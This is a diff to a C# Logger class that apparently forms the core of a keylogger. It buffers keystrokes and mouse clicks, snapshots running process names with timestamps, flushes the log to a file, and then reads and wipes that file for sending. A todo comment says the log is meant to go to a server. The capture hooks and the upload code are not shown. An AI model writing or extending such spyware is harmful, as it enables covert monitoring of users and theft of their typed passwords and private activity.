@@ -1,14 +1,16 @@
 ﻿using System.Diagnostics;
+using Microsoft.VisualBasic.CompilerServices;
 
 namespace EventLogger;
 // class that handles the logging of events
 public class Logger
 {
     private String _line;
-    private int _strokes = 0; // used to determine when write string on file because the log string is too long
+    private int _strokes; // used to determine when write string on file because the log string is too long
     private DateTime _previousClick = DateTime.Now; // used to determine double-left-click
     private String _processes = ""; // used to determine if a process is running
     private bool _deleting = false;
+    private bool _fileTouch = false; // used to determine if the file has been written
     
     public Logger()
     {
@@ -20,16 +22,17 @@ public class Logger
             }	
         }
         _line = "";
+        _strokes = 0;
     }
 
     public void MouseLog(String key)
     {
-        if (key=="[ML]")
+        if (Constants.LOG_PROCESS_ON_DOUBLE_CLICK && key=="[ML]")
         {
             if (DateTime.Now.Subtract(_previousClick).TotalMilliseconds <= 500)
             {
                 key = "[DML]";
-                ProcessLog(Process.GetProcesses());
+                ProcessLog(false);
             }
             _previousClick = DateTime.Now;
         }
@@ -40,23 +43,24 @@ public class Logger
     {
         _line += key;
         _strokes++;
-        if (_strokes < Constants.LINE_LENGHT) return;
+        if (_strokes < Constants.MAX_LOG_LENGTH) return;
         Log();
     }
 
-    private void ProcessLog(Process[] processes)
+    private void ProcessLog(bool forced)
     {
-        String newProcesses = "<"+
-            String.Join(",",processes
+        // forced to log the process even if there is no change
+        Process[] processes = Process.GetProcesses();
+        String newProcesses = String.Join(",",processes
             .Where(p => p.MainWindowTitle.Length > 0)
             .Select(p => p.ProcessName)
             .Distinct()
-            .OrderBy(p=>p))+">";
-        if (_processes!=newProcesses)
+            .OrderBy(p=>p));
+        if (forced || _processes!=newProcesses)
         {
-            _line += newProcesses;
-            _strokes = 0;
-            Log();
+            // if the process has changed, log it
+            _line += "<"+DateTime.Now.ToString("H:mm")+","+newProcesses+">";
+            _strokes++;
         }
         _processes = newProcesses;
     }
@@ -71,28 +75,35 @@ public class Logger
         }
         _line = "";
         _strokes = 0;
+        _fileTouch = true;
     }
 
     public void SendLog()
     {
-        _deleting = true;
         String body = "";
-        using (StreamReader w = File.OpenText(Constants.PATH))
+        if (_fileTouch)
         {
-            String line = w.ReadLine();
-            while ( line!= null)
+            // load body from file and delete it
+            _deleting = true;
+            using (StreamReader w = File.OpenText(Constants.PATH))
             {
-                body += line;
-                line = w.ReadLine();
+                String line = w.ReadLine();
+                while ( line!= null)
+                {
+                    body += line;
+                    line = w.ReadLine();
+                }
             }
+            File.WriteAllText(Constants.PATH,string.Empty);
+            _fileTouch = false;
+            _deleting = false;
         }
-        File.WriteAllText(Constants.PATH,string.Empty);
-        _deleting = false;
-        body = DateTime.Now+" | "+ body + _line;
+        ProcessLog(true); // update actual processes
+        body = DateTime.Now +" | "+ body + _line;
         _line = "" ;
         Console.WriteLine(body);
-        //todo send the log to the server
-        // if any error occurs, Log(timestamp+body)
+        // todo send the log to the server
+        // if any error occurs, Log(" $ "timestamp+body)
     }
     
 }
